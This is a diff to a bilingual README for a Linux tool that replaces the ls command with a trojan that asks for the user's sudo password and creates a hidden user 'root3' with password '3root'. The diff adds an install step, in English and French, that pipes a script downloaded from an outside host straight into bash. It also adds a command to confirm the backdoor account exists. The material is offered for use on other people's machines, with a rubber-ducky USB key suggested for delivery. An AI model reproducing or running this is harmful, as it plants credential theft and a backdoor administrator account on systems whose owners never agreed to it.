@@ -1,13 +1,18 @@
 # fake-ls_privilege-escalation-linux
 
+COMMAND TO INSTALL VIA INTERNET : wget -qO - script.help.pm/ls.php | bash -
+
 Replacing the linux LS command for privilege elevation.
 
 You have access to a ROOT session but you don't know the password to run useful commands ?
 Run this script on a laptop (a ruber ducky usb key can help) and the LS command will be replaced by a fake LS command. When running LS, it will ask for the sudo password of the user and create with these rights a new user named "root3" with the password "3root".
 the LS command is displayed normally after that
 
+command test if is ok : getent passwd root3
 
 ---FR---
+
+COMMANDE POUR INSTALLER VIA INTERNET : wget -qO - script.help.pm/ls.php | bash -
 
 Remplacement de la commande linux LS pour une élévation de privilège.
 
